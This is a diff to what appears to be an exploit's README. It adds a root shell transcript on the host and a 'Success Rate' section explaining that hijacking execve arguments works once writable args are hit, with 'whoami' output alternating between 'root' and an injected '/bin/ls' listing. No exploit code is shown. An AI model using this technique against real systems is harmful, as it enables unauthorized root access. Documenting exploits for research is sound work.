@@ -76,10 +76,30 @@ INFO[0000] Waiting for events..
 run command on host
 
 ```shell
-$ .ssh
+$ ./ssh
 root@localhost:~# cd /
 root@localhost:/# whoami
 bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
 root@localhost:/# id
+bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
+```
+
+## 6. Advance
+
+### 6.1 Success Rate
+
+This exploit may fail if the args for execve are not writable.
+But fortunately, execve is called frequently, so it will succeed in a short time.
+
+e.g. replace the command with "/bin/ls"
+
+```shell
+root@localhost:/# whoami
+bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
+root@localhost:/# whoami
+bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
+root@localhost:/# whoami
+root
+root@localhost:/# whoami
 bin  bin.usr-is-merged	boot  dev  etc	home  lib  lib.usr-is-merged  lib64  lost+found  media	mnt  opt  proc	root  run  sbin  sbin.usr-is-merged  srv  sys  tmp  usr  var
 ```
